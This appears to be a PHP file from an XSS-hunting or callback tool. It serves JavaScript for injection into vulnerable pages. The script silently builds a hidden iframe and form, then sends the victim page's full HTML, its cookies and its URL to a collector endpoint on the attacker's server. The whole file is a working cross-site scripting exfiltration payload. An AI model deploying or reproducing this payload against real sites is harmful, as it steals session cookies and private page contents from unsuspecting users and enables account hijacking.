<?php

require_once('../config.php');

validate_secret();

$callback_token = fetch_key($_REQUEST, PARAMETER_CALLBACK_TOKEN);

if(!is_string($callback_token) || strlen($callback_token) == 0) {
  halt_for_usage('/xss.php?callback_token=:token');
}

collect_additional_headers();

update_access_log();

header('Content-Type: application/javascript');
?>
(function() {
  // mostly copied from https://stackoverflow.com/questions/298745/
  var form = document.createElement("form");
  var iframe = document.createElement("iframe");
  var uniqueString = "collector-form";

  // append hidden iframe to POST to for our collector form
  document.head.appendChild(iframe);
  iframe.style.display = "none";
  iframe.contentWindow.name = uniqueString;

  // construct a form with hidden inputs, targeting the iframe
  var form = document.createElement("form");
  form.target = uniqueString;
  form.action = "<?= domain_with_scheme(); ?>/ping.php?" +
    "secret=<?= SECRET; ?>&body=%20";
  form.method = "POST";

  // capture document body in POST parameter to avoid URL
  // too long exception
  var input = document.createElement("input");
  input.type = "hidden";
  input.name = "html";
  input.value = document.documentElement.innerHTML;
  form.appendChild(input);

  // capture document cookies in POST parameter to avoid URL
  // too long exception
  var input = document.createElement("input");
  input.type = "hidden";
  input.name = "cookies";
  input.value = document.cookie;
  form.appendChild(input);

  // capture window in POST parameter to avoid URL
  // too long exception
  var input = document.createElement("input");
  input.type = "hidden";
  input.name = "window";
  input.value = window.location.href;
  form.appendChild(input);

  // append form to document and submit form
  document.head.appendChild(form);
  form.submit();
})();
